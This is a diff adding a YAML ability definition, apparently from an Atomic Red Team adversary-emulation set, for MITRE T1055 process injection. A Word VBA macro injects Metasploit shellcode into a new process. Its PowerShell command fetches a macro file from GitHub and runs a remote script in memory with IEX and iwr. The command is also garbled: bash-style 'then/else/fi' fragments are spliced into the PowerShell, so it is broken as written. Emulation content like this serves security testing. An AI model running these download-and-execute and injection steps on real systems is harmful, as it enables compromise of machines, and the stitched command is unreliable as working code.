@@ -1,0 +1,75 @@
+- id: 1c91e740-1729-4329-b779-feba6e71d048
+  name: Shellcode execution via VBA
+  description: 'This module injects shellcode into a newly created process and executes.
+    By default the shellcode is created,
+
+    with Metasploit, for use on x86-64 Windows 10 machines.
+
+
+    Note: Due to the way the VBA code handles memory/pointers/injection, a 64bit installation
+    of Microsoft Office
+
+    is required.'
+  tactic: privilege-escalation
+  technique:
+    attack_id: T1055
+    name: Process Injection
+  platforms:
+    windows:
+      psh:
+        command: 'try {; $wdApp = New-Object -COMObject "Word.Application"; $path
+          = $wdApp.Path; Stop-Process -Name "winword"; if ($path.contains("(x86)"))
+          { exit 1 } else { exit 0 }; } catch { exit 1 }; then : ; else Write-Host
+          "You will need to install Microsoft Word (64-bit) manually to meet this
+          requirement"; fi; if (Test-Path "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt")
+          {exit 0} else {exit 1}; then : ; else New-Item -Type Directory (split-path
+          "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt") -ErrorAction ignore
+          | Out-Null; Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt"
+          -OutFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt" -UseBasicParsing;
+          fi; [Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12;
+          IEX (iwr "https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1"
+          -UseBasicParsing); Invoke-Maldoc -macroFile "PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt"
+          -officeProduct "Word" -sub "Execute"'
+  plugin: atomic
+  singleton: false
+  repeatable: true
+  delete_payload: false
+  privilege: ''
+  buckets:
+  - privilege-escalation
+  - atomic-red-team
+  - t1055
+  author: Atomic Red Team
+  additional_info:
+    input_arguments:
+      txt_path:
+        description: Path to file containing VBA macro to run
+        type: path
+        default: PathToAtomicsFolder\T1055\src\x64\T1055-macrocode.txt
+    dependencies:
+    - description: 'The 64-bit version of Microsoft Office must be installed
+
+        '
+      prereq_command: "try {\n  $wdApp = New-Object -COMObject \"Word.Application\"\
+        \n  $path = $wdApp.Path\n  Stop-Process -Name \"winword\"\n  if ($path.contains(\"\
+        (x86)\")) { exit 1 } else { exit 0 }\n} catch { exit 1 }\n"
+      get_prereq_command: 'Write-Host "You will need to install Microsoft Word (64-bit)
+        manually to meet this requirement"
+
+        '
+    - description: '"#{txt_path}" must exist on disk at specified location
+
+        '
+      prereq_command: 'if (Test-Path "#{txt_path}") {exit 0} else {exit 1}
+
+        '
+      get_prereq_command: 'New-Item -Type Directory (split-path "#{txt_path}") -ErrorAction
+        ignore | Out-Null
+
+        Invoke-WebRequest "https://github.com/redcanaryco/atomic-red-team/raw/master/atomics/T1055/src/x64/T1055-macrocode.txt"
+        -OutFile "#{txt_path}" -UseBasicParsing
+
+        '
+    technique_created: '2017-05-31T21:30:47.843Z'
+    atomic_guid: 1c91e740-1729-4329-b779-feba6e71d048
+    import_timestamp: '2025-06-24T11:15:01.897642Z'
